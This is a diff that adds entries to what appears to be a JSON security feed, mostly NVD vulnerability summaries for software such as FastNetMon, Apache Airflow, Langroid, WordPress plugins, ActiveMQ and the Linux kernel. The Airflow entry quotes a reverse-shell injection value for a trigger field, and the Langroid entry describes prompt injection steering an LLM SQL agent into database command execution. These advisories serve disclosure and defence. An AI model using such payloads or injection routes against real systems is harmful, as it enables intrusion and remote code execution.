@@ -6006,5 +6006,278 @@
     ],
     "title": "Anubis ransomware claims Coca-Cola Fairlife attack, threatens data leak",
     "url": "https://www.bleepingcomputer.com/news/security/anubis-ransomware-claims-coca-cola-fairlife-attack-threatens-data-leak/"
+  },
+  {
+    "category": "high",
+    "cvss": 9.8,
+    "id": "CVE-2026-48687",
+    "published": "2026-05-26T16:16:26.800",
+    "severity": "critical",
+    "source": "NVD",
+    "summary": "FastNetMon Community Edition through 1.2.9 contains an OS command injection vulnerability in the Juniper router integration plugin. The _log() function in src/juniper_plugin/fastnetmon_juniper.php (lines 117-118) constructs shell commands by concatenating the $msg parameter directly into exec() calls: exec(\"echo `date` \\\"- {FASTNETMON] - \" . $msg . \" \\\" >> \" . $FILE_LOG_TMP). The $msg variable contains unsanitized data derived from command-line arguments argv[1] through argv[3], which represent the attack IP address, direction, and power. While FastNetMon's C++ core currently passes IP addresses via inet_ntoa() (which only produces safe dotted-decimal notation), the PHP script performs no input validation or shell escaping. If the script is invoked directly, by another orchestration system, or if future code changes pass string-sourced IPs, arbitrary commands can be injected. The correct fix is to replace exec() with file_put_contents() or use escapeshellarg() on all parameters.",
+    "tags": [
+      "RCE"
+    ],
+    "title": "CVE-2026-48687 (CVSS 9.8)",
+    "url": "https://nvd.nist.gov/vuln/detail/CVE-2026-48687"
+  },
+  {
+    "category": "high",
+    "cvss": 9.1,
+    "id": "CVE-2026-42252",
+    "published": "2026-06-01T09:16:18.560",
+    "severity": "critical",
+    "source": "NVD",
+    "summary": "Apache Airflow's official documentation at `core-concepts/dag-run.html` (\"Passing Parameters when triggering Dags\") showed a verbatim `BashOperator(bash_command=\"echo value: {{ dag_run.conf['conf1'] }}\")` example without any quoting / sanitization warning. Dag authors who copied the pattern verbatim into deployments where users had `Dag.can_trigger` permission on the affected Dag (typical multi-team deployments, hosted offerings exposing a trigger API) could be exposed to shell-metacharacter injection via the `conf` field of the trigger API: an authenticated trigger user could supply `\"; bash -i >& /dev/tcp/.../9999 0>&1; #\"` as a `conf` value and reach an `os.exec` on the worker. This CVE covers the documentation correction in `apache/airflow` PR 64129 — the pattern in the docs example now includes explicit shell-quoting and a safety caveat. Affects deployments whose Dag code was modeled on the pre-correction docs example. Same class as the prior CVE-2025-50213 and CVE-2025-27018 documentation-pattern fixes. Users are advised to upgrade to `apache-airflow` 3.2.2 or later to pick up the corrected documentation shipped with the release.",
+    "tags": [],
+    "title": "CVE-2026-42252 (CVSS 9.1)",
+    "url": "https://nvd.nist.gov/vuln/detail/CVE-2026-42252"
+  },
+  {
+    "category": "high",
+    "cvss": 9.8,
+    "id": "CVE-2026-25879",
+    "published": "2026-06-01T23:16:21.930",
+    "severity": "critical",
+    "source": "NVD",
+    "summary": "Langroid is a framework for building large-language-model-powered applications. Prior to version 0.63.0, SQLChatAgent executes SQL produced by an LLM, which is influenceable by prompt injection. When configured with a database role that has privileges enabling code execution or filesystem access (e.g., PostgreSQL pg_execute_server_program, MySQL FILE, MSSQL xp_cmdshell), an attacker who can shape the agent's input — including indirectly via data returned to the LLM — can coerce execution of dialect-specific primitives such as `COPY ... FROM PROGRAM`, achieving RCE on the database host. Fixed in v0.63.0 by defaulting SQLChatAgent to a SELECT-only sqlglot-parsed statement allowlist with a dialect-aware dangerous-pattern blocklist; allow_dangerous_operations=True restores the previous unrestricted behavior for trusted deployments.",
+    "tags": [
+      "AI",
+      "RCE"
+    ],
+    "title": "CVE-2026-25879 (CVSS 9.8)",
+    "url": "https://nvd.nist.gov/vuln/detail/CVE-2026-25879"
+  },
+  {
+    "category": "high",
+    "cvss": 9.8,
+    "id": "CVE-2026-5076",
+    "published": "2026-06-02T20:16:40.720",
+    "severity": "critical",
+    "source": "NVD",
+    "summary": "The ARMember Premium plugin for WordPress is vulnerable to an insecure password reset mechanism in all versions up to, and including, 7.3.1. The plugin stores a plaintext copy of the password reset key in the `arm_reset_password_key` user meta field when a user requests a password reset. This is in addition to the hashed key that WordPress core stores securely in `wp_users.user_activation_key`. The plaintext key stored in `wp_usermeta` can be used with the plugin's custom `armrp` reset action to set a new password for any user. Combined with another vulnerability such as SQL Injection (CVE-2026-5073, CVE-2026-5074), this makes it possible for unauthenticated attackers to extract the plaintext reset key and take over any user account, including administrators.",
+    "tags": [],
+    "title": "CVE-2026-5076 (CVSS 9.8)",
+    "url": "https://nvd.nist.gov/vuln/detail/CVE-2026-5076"
+  },
+  {
+    "category": "high",
+    "cvss": 8.1,
+    "id": "CVE-2026-4350",
+    "published": "2026-04-03T08:16:17.547",
+    "severity": "high",
+    "source": "NVD",
+    "summary": "The Perfmatters plugin for WordPress is vulnerable to arbitrary file deletion via path traversal in all versions up to, and including, 2.5.9.1. This is due to the `PMCS::action_handler()` method processing the `$_GET['delete']` parameter without any sanitization, authorization check, or nonce verification. The unsanitized filename is concatenated with the storage directory path and passed to `unlink()`. This makes it possible for authenticated attackers, with Subscriber-level access and above, to delete arbitrary files on the server by using `../` path traversal sequences, including `wp-config.php` which would force WordPress into the installation wizard and allow full site takeover.",
+    "tags": [
+      "RCE"
+    ],
+    "title": "CVE-2026-4350 (CVSS 8.1)",
+    "url": "https://nvd.nist.gov/vuln/detail/CVE-2026-4350"
+  },
+  {
+    "category": "high",
+    "cvss": 8.8,
+    "id": "CVE-2026-23425",
+    "published": "2026-04-03T14:16:28.747",
+    "severity": "high",
+    "source": "NVD",
+    "summary": "In the Linux kernel, the following vulnerability has been resolved:\n\nKVM: arm64: Fix ID register initialization for non-protected pKVM guests\n\nIn protected mode, the hypervisor maintains a separate instance of\nthe `kvm` structure for each VM. For non-protected VMs, this structure is\ninitialized from the host's `kvm` state.\n\nCurrently, `pkvm_init_features_from_host()` copies the\n`KVM_ARCH_FLAG_ID_REGS_INITIALIZED` flag from the host without the\nunderlying `id_regs` data being initialized. This results in the\nhypervisor seeing the flag as set while the ID registers remain zeroed.\n\nConsequently, `kvm_has_feat()` checks at EL2 fail (return 0) for\nnon-protected VMs. This breaks logic that relies on feature detection,\nsuch as `ctxt_has_tcrx()` for TCR2_EL1 support. As a result, certain\nsystem registers (e.g., TCR2_EL1, PIR_EL1, POR_EL1) are not\nsaved/restored during the world switch, which could lead to state\ncorruption.\n\nFix this by explicitly copying the ID registers from the host `kvm` to\nthe hypervisor `kvm` for non-protected VMs during initialization, since\nwe trust the host with its non-protected guests' features. Also ensure\n`KVM_ARCH_FLAG_ID_REGS_INITIALIZED` is cleared initially in\n`pkvm_init_features_from_host` so that `vm_copy_id_regs` can properly\ninitialize them and set the flag once done.",
+    "tags": [],
+    "title": "CVE-2026-23425 (CVSS 8.8)",
+    "url": "https://nvd.nist.gov/vuln/detail/CVE-2026-23425"
+  },
+  {
+    "category": "high",
+    "cvss": 5.5,
+    "id": "CVE-2026-23435",
+    "published": "2026-04-03T16:16:25.083",
+    "severity": "high",
+    "source": "NVD",
+    "summary": "In the Linux kernel, the following vulnerability has been resolved:\n\nperf/x86: Move event pointer setup earlier in x86_pmu_enable()\n\nA production AMD EPYC system crashed with a NULL pointer dereference\nin the PMU NMI handler:\n\n  BUG: kernel NULL pointer dereference, address: 0000000000000198\n  RIP: x86_perf_event_update+0xc/0xa0\n  Call Trace:\n   <NMI>\n   amd_pmu_v2_handle_irq+0x1a6/0x390\n   perf_event_nmi_handler+0x24/0x40\n\nThe faulting instruction is `cmpq $0x0, 0x198(%rdi)` with RDI=0,\ncorresponding to the `if (unlikely(!hwc->event_base))` check in\nx86_perf_event_update() where hwc = &event->hw and event is NULL.\n\ndrgn inspection of the vmcore on CPU 106 showed a mismatch between\ncpuc->active_mask and cpuc->events[]:\n\n  active_mask: 0x1e (bits 1, 2, 3, 4)\n  events[1]:   0xff1100136cbd4f38  (valid)\n  events[2]:   0x0                 (NULL, but active_mask bit 2 set)\n  events[3]:   0xff1100076fd2cf38  (valid)\n  events[4]:   0xff1100079e990a90  (valid)\n\nThe event that should occupy events[2] was found in event_list[2]\nwith hw.idx=2 and hw.state=0x0, confirming x86_pmu_start() had run\n(which clears hw.state and sets active_mask) but events[2] was\nnever populated.\n\nAnother event (event_list[0]) had hw.state=0x7 (STOPPED|UPTODATE|ARCH),\nshowing it was stopped when the PMU rescheduled events, confirming the\nthrottle-then-reschedule sequence occurred.\n\nThe root cause is commit 7e772a93eb61 (\"perf/x86: Fix NULL event access\nand potential PEBS record loss\") which moved the cpuc->even",
+    "tags": [],
+    "title": "CVE-2026-23435 (CVSS 5.5)",
+    "url": "https://nvd.nist.gov/vuln/detail/CVE-2026-23435"
+  },
+  {
+    "category": "high",
+    "cvss": 8.1,
+    "id": "CVE-2026-31392",
+    "published": "2026-04-03T16:16:37.300",
+    "severity": "high",
+    "source": "NVD",
+    "summary": "In the Linux kernel, the following vulnerability has been resolved:\n\nsmb: client: fix krb5 mount with username option\n\nCustomer reported that some of their krb5 mounts were failing against\na single server as the client was trying to mount the shares with\nwrong credentials.  It turned out the client was reusing SMB session\nfrom first mount to try mounting the other shares, even though a\ndifferent username= option had been specified to the other mounts.\n\nBy using username mount option along with sec=krb5 to search for\nprincipals from keytab is supported by cifs.upcall(8) since\ncifs-utils-4.8.  So fix this by matching username mount option in\nmatch_session() even with Kerberos.\n\nFor example, the second mount below should fail with -ENOKEY as there\nis no 'foobar' principal in keytab (/etc/krb5.keytab).  The client\nends up reusing SMB session from first mount to perform the second\none, which is wrong.\n\n```\n$ ktutil\nktutil:  add_entry -password -p testuser -k 1 -e aes256-cts\nPassword for testuser@ZELDA.TEST:\nktutil:  write_kt /etc/krb5.keytab\nktutil:  quit\n$ klist -ke\nKeytab name: FILE:/etc/krb5.keytab\nKVNO Principal\n ---- ----------------------------------------------------------------\n   1 testuser@ZELDA.TEST (aes256-cts-hmac-sha1-96)\n$ mount.cifs //w22-root2/scratch /mnt/1 -o sec=krb5,username=testuser\n$ mount.cifs //w22-root2/scratch /mnt/2 -o sec=krb5,username=foobar\n$ mount -t cifs | grep -Po 'username=\\K\\w+'\ntestuser\ntestuser\n```",
+    "tags": [],
+    "title": "CVE-2026-31392 (CVSS 8.1)",
+    "url": "https://nvd.nist.gov/vuln/detail/CVE-2026-31392"
+  },
+  {
+    "category": "high",
+    "cvss": 8.1,
+    "id": "CVE-2026-4896",
+    "published": "2026-04-04T08:16:06.543",
+    "severity": "high",
+    "source": "NVD",
+    "summary": "The WCFM – Frontend Manager for WooCommerce along with Bookings Subscription Listings Compatible plugin for WordPress is vulnerable to Insecure Direct Object Reference in all versions up to, and including, 6.7.25 via multiple AJAX actions including `wcfm_modify_order_status`, `delete_wcfm_article`, `delete_wcfm_product`, and the article management controller due to missing validation on user-supplied object IDs. This makes it possible for authenticated attackers, with Vendor-level access and above, to modify the status of any order, delete or modify any post/product/page, regardless of ownership.",
+    "tags": [
+      "RCE"
+    ],
+    "title": "CVE-2026-4896 (CVSS 8.1)",
+    "url": "https://nvd.nist.gov/vuln/detail/CVE-2026-4896"
+  },
+  {
+    "category": "high",
+    "cvss": 8.1,
+    "id": "CVE-2026-45361",
+    "published": "2026-05-25T10:16:15.087",
+    "severity": "high",
+    "source": "NVD",
+    "summary": "Apache Airflow providers-google's `ComputeEngineSSHHook` disables SSH host-key verification by default, exposing SSH traffic between an Airflow worker and a Compute Engine VM to in-path network attackers who can intercept or modify the session. Users are advised to upgrade to `apache-airflow-providers-google` 22.0.0 or later.",
+    "tags": [
+      "RCE"
+    ],
+    "title": "CVE-2026-45361 (CVSS 8.1)",
+    "url": "https://nvd.nist.gov/vuln/detail/CVE-2026-45361"
+  },
+  {
+    "category": "high",
+    "cvss": 8.1,
+    "id": "CVE-2026-48695",
+    "published": "2026-05-26T18:16:52.950",
+    "severity": "high",
+    "source": "NVD",
+    "summary": "FastNetMon Community Edition through 1.2.9 contains an OS command injection vulnerability in the MikroTik router integration plugin. The _log() function in src/mikrotik_plugin/fastnetmon_mikrotik.php (lines 107-108) constructs shell commands by concatenating the $msg parameter directly into exec() calls: exec(\"echo `date` \\\"- {FASTNETMON] - \" . $msg . \" \\\" >> \" . $FILE_LOG_TMP). This is identical in pattern to the Juniper plugin vulnerability. The $msg variable contains unsanitized attack data from command-line arguments. An attacker who can influence argv[] values can inject arbitrary shell commands. The fix is to replace exec() with file_put_contents() or use escapeshellarg().",
+    "tags": [],
+    "title": "CVE-2026-48695 (CVSS 8.1)",
+    "url": "https://nvd.nist.gov/vuln/detail/CVE-2026-48695"
+  },
+  {
+    "category": "high",
+    "cvss": 8.8,
+    "id": "CVE-2026-42359",
+    "published": "2026-06-01T09:16:18.907",
+    "severity": "high",
+    "source": "NVD",
+    "summary": "A bug in Apache Airflow's XCom PATCH endpoint `PATCH /api/v2/xcomEntries/{key}` allowed an authenticated UI/API user with XCom write permission on a Dag to set XCom entries under reserved key names (e.g. `return_value`) that the matching POST endpoint already validated against `FORBIDDEN_XCOM_KEYS`. The endpoint also accepted serialized payload shapes the triggerer's deserializer treats as code; combined, this allowed RCE on the triggerer when the affected task next deferred. Affects deployments where untrusted users have XCom write permission on Dags that defer to the triggerer. This is a fix-bypass of CVE-2026-33858: PR #64148 added the `FORBIDDEN_XCOM_KEYS` validator only on the POST/set path; the PATCH path was not covered. Users who already upgraded for CVE-2026-33858 should additionally upgrade to `apache-airflow` 3.2.2 or later to cover the PATCH-path bypass.",
+    "tags": [
+      "RCE"
+    ],
+    "title": "CVE-2026-42359 (CVSS 8.8)",
+    "url": "https://nvd.nist.gov/vuln/detail/CVE-2026-42359"
+  },
+  {
+    "category": "high",
+    "cvss": 8.8,
+    "id": "CVE-2026-45505",
+    "published": "2026-06-01T09:16:19.700",
+    "severity": "high",
+    "source": "NVD",
+    "summary": "Improper Input Validation, Improper Control of Generation of Code ('Code Injection') vulnerability in Apache ActiveMQ Broker, Apache ActiveMQ All, Apache ActiveMQ.\n\n\nNon-parenthesized discovery wrappers such as `masterslave:vm://...,...`\nand `static:vm://...` incorrectly pass validation allowing bypass of fix in CVE-2026-34197. \n\nOriginal description from CVE-2026-34197.\n\nApache ActiveMQ exposes the Jolokia JMX-HTTP bridge at /api/jolokia/ on the web console. The default Jolokia access policy permits exec operations on all ActiveMQ MBeans (org.apache.activemq:*), including BrokerService.addNetworkConnector(String) and BrokerService.addConnector(String). An authenticated attacker can invoke these operations with a crafted discovery UR that triggers the VM transport's brokerConfig parameter to load a remote Spring XML application context using ResourceXmlApplicationContext. Because Spring's ResourceXmlApplicationContext instantiates all singleton beans before the BrokerService validates the configuration, arbitrary code execution occurs on the broker's JVM through bean factory methods such as Runtime.exec(). \nThis issue affects Apache ActiveMQ Broker: before 5.19.7, from 6.0.0 before 6.2.6; Apache ActiveMQ All: before 5.19.7, from 6.0.0 before 6.2.6; Apache ActiveMQ: before 5.19.7, from 6.0.0 before 6.2.6.\n\nUsers are recommended to upgrade to version 5.19.7 or 6.2.6, which fixes the issue.",
+    "tags": [
+      "RCE"
+    ],
+    "title": "CVE-2026-45505 (CVSS 8.8)",
+    "url": "https://nvd.nist.gov/vuln/detail/CVE-2026-45505"
+  },
+  {
+    "category": "high",
+    "cvss": 8.8,
+    "id": "CVE-2026-49298",
+    "published": "2026-06-01T09:16:20.770",
+    "severity": "high",
+    "source": "NVD",
+    "summary": "A bug in Apache Airflow's KubernetesExecutor caused JWT tokens used by worker pods to authenticate against the Execution API to be passed to the worker container as command-line arguments visible in the pod spec. An authenticated UI/API user with Kubernetes read-only access to the cluster (e.g. `pods/get` in the Airflow namespace) could harvest the JWT from `kubectl describe pod` output and then call state-mutating Execution API endpoints — triggering Dag runs, clearing runs, reading or writing Variables / Connections / XComs — as if they were a running task. Affects deployments using the `KubernetesExecutor`. Users are advised to upgrade to `apache-airflow` 3.2.2 or later. This is the airflow-core half of the same vulnerability addressed by [CVE-2026-27173](https://www.cve.org/CVERecord?id=CVE-2026-27173), which shipped the apache-airflow-providers-cncf-kubernetes side of the fix. Deployments that already upgraded `apache-airflow-providers-cncf-kubernetes` to 10.17.0 or later per the CVE-2026-27173 advisory should additionally upgrade `apache-airflow` to 3.2.2 or later to close the core-side surface — the two fixes are complementary, not duplicates.",
+    "tags": [],
+    "title": "CVE-2026-49298 (CVSS 8.8)",
+    "url": "https://nvd.nist.gov/vuln/detail/CVE-2026-49298"
+  },
+  {
+    "category": "high",
+    "cvss": 8.1,
+    "id": "CVE-2026-42211",
+    "published": "2026-06-02T20:16:36.537",
+    "severity": "high",
+    "source": "NVD",
+    "summary": "React Router is a router for React. In versions 7.0.0 through 7.14.1, when using Framework Mode, a combination of steps could potentially allow unauthorized remote code execution (RCE) through external requests. This attack requires the application code to have an existing prototype pollution vulnerability, which can then be leveraged in a 2-step attack where the second step triggers unauthorized RCE on the remote server. This does not impact applications using Declarative Mode (`<BrowserRouter>`) or Data Mode (`createBrowserRouter/<RouterProvider>`). This is patched in version 7.14.2.",
+    "tags": [
+      "RCE"
+    ],
+    "title": "CVE-2026-42211 (CVSS 8.1)",
+    "url": "https://nvd.nist.gov/vuln/detail/CVE-2026-42211"
+  },
+  {
+    "category": "high",
+    "cvss": 8.0,
+    "id": "CVE-2026-35482",
+    "published": "2026-06-02T23:16:37.473",
+    "severity": "high",
+    "source": "NVD",
+    "summary": "alf.io is an open source ticket reservation system for conferences, trade shows, workshops, and meetups. Prior to version 2.0-M5-2606, a sandbox escape vulnerability in the alf.io extension script engine allows an authenticated administrator to execute arbitrary operating system commands on the server. The extension system is intended to execute restricted JavaScript in a sandboxed Rhino environment; however, a combination of an unguarded injected Java object (`returnClass`) and an incomplete AST blocklist allows the sandbox to be fully escaped using Java reflection without triggering any validation errors. Version 2.0-M5-2606 patches the issue.",
+    "tags": [
+      "RCE"
+    ],
+    "title": "CVE-2026-35482 (CVSS 8.0)",
+    "url": "https://nvd.nist.gov/vuln/detail/CVE-2026-35482"
+  },
+  {
+    "category": "high",
+    "cvss": 8.1,
+    "id": "CVE-2026-44654",
+    "published": "2026-06-02T23:16:38.260",
+    "severity": "high",
+    "source": "NVD",
+    "summary": "LibreChat is an enhanced ChatGPT clone that supports multiple AI providers. In versions up to and including 0.8.3, a shared-agent editor can delete file records through `DELETE /api/files` that the owner has reused across multiple agents. The deletion removes the file globally — not just from the shared agent — breaking the owner's other private agents that reference the same `file_id`. The private agent retains a stale `file_id` reference that no longer resolves. A shared-agent editor can destroy files that the owner uses across multiple agents. The owner's private agents — which the attacker has no access to — break silently with stale `file_id` references. This is a cross-agent integrity violation: editing access to one agent should not affect another. Version 0.8.4 contains a patch.",
+    "tags": [],
+    "title": "CVE-2026-44654 (CVSS 8.1)",
+    "url": "https://nvd.nist.gov/vuln/detail/CVE-2026-44654"
+  },
+  {
+    "category": "high",
+    "cvss": 8.8,
+    "id": "CVE-2026-6657",
+    "published": "2026-06-03T16:16:31.710",
+    "severity": "high",
+    "source": "NVD",
+    "summary": "A vulnerability in jupyter-server versions 1.12.0 through 2.17.0 allows an attacker to bypass CORS origin validation when the `allow_origin_pat` configuration is used. The issue arises from the use of `re.match()` for validating the `Origin` header, which only anchors at the start of the string. This allows attacker-controlled domains such as `trusted.example.com.evil.com` to pass validation against patterns intended to match `trusted.example.com`. The vulnerability affects multiple locations in the codebase, including CORS headers, WebSocket connections, referer validation, and login redirects, potentially enabling phishing attacks, arbitrary code execution, and unauthorized access to sensitive API responses.",
+    "tags": [
+      "피싱"
+    ],
+    "title": "CVE-2026-6657 (CVSS 8.8)",
+    "url": "https://nvd.nist.gov/vuln/detail/CVE-2026-6657"
+  },
+  {
+    "category": "high",
+    "cvss": 7.8,
+    "id": "CVE-2026-40290",
+    "published": "2026-06-03T18:16:23.707",
+    "severity": "high",
+    "source": "NVD",
+    "summary": "OP-TEE is a Trusted Execution Environment (TEE) designed as companion to a non-secure Linux kernel running on Arm; Cortex-A cores using the TrustZone technology. Starting in version 3.16.0 and prior to 4.11.0, a user-after-free (UAF) race condition exists in the shared memory teardown logic of FF-A  within OP-TEE SPMC/SP flows. This only applies when OP-TEE is configured as an SPMC for S-EL0 SPs, that is, with `CFG_SECURE_PARTITION=y`. The function `sp_mem_remove()`, responsible for freeing entries in `smem->receivers` and `smem->regions`, fails to acquire the global `sp_mem_lock` before performing the `free()` operations. Concurrently, other code paths, such as `sp_mem_get_receiver()`, iterate over these same lists without holding a lock, or, like `sp_mem_is_shared()`, iterate while holding the lock but are not serialized against the unprotected `free()` in `sp_mem_remove()`. This creates a cross-thread race where a thread iterating the list can acquire a pointer to an entry (e.g., `struct sp_mem_map_region` or `struct sp_mem_receiver`), and then another thread calls `sp_mem_remove()`, freeing the object. When the first thread resumes and dereferences the pointer, it results in a Use-After-Free vulnerability. Version 4.11.0 fixes the issue.",
+    "tags": [],
+    "title": "CVE-2026-40290 (CVSS 7.8)",
+    "url": "https://nvd.nist.gov/vuln/detail/CVE-2026-40290"
+  },
+  {
+    "category": "high",
+    "cvss": 8.6,
+    "id": "CVE-2026-50131",
+    "published": "2026-06-10T22:17:01.543",
+    "severity": "high",
+    "source": "NVD",
+    "summary": "Fedify is a TypeScript library for building federated server apps powered by ActivityPub. Fedify previously addressed SSRF/internal network access in GHSA-p9cg-vqcc-grcx by adding public URL validation before runtime document and media fetching. However, the IPv4 validation logic present starting in version 0.11.2 and prior to versions 1.9.12, 1.10.11, 2.0.19, 2.1.15, and 2.2.4 appears incomplete. The `validatePublicUrl()` protection relies on `isValidPublicIPv4Address()` to reject non-public IPv4 destinations. The function blocks common private and local ranges such as `10.0.0.0/8`, `127.0.0.0/8`, `169.254.0.0/16`, `172.16.0.0/12`, and `192.168.0.0/16`, but it still treats several special-use, reserved, multicast, benchmarking, and carrier-grade NAT IPv4 ranges as valid public destinations. Because this validation is used as an SSRF defense before outbound fetches, this appears to be an incomplete mitigation or bypass class for the previous SSRF issue. Versions 1.9.12, 1.10.11, 2.0.19, 2.1.15, and 2.2.4 contain an updated patch.",
+    "tags": [],
+    "title": "CVE-2026-50131 (CVSS 8.6)",
+    "url": "https://nvd.nist.gov/vuln/detail/CVE-2026-50131"
+  },
+  {
+    "author": "",
+    "category": "news",
+    "id": "https://therecord.media/jay-clayton-dni-nomination-senate-committee-approval",
+    "published": "2026-07-21T19:00:00+00:00",
+    "severity": "info",
+    "source": "The Record",
+    "summary": "By a party-line vote, the Senate Intelligence Committee sent the nomination of Jay Clayton to lead ODNI to the Senate floor.",
+    "tags": [],
+    "title": "DNI nominee Clayton wins Senate panel’s approval",
+    "url": "https://therecord.media/jay-clayton-dni-nomination-senate-committee-approval"
   }
 ]
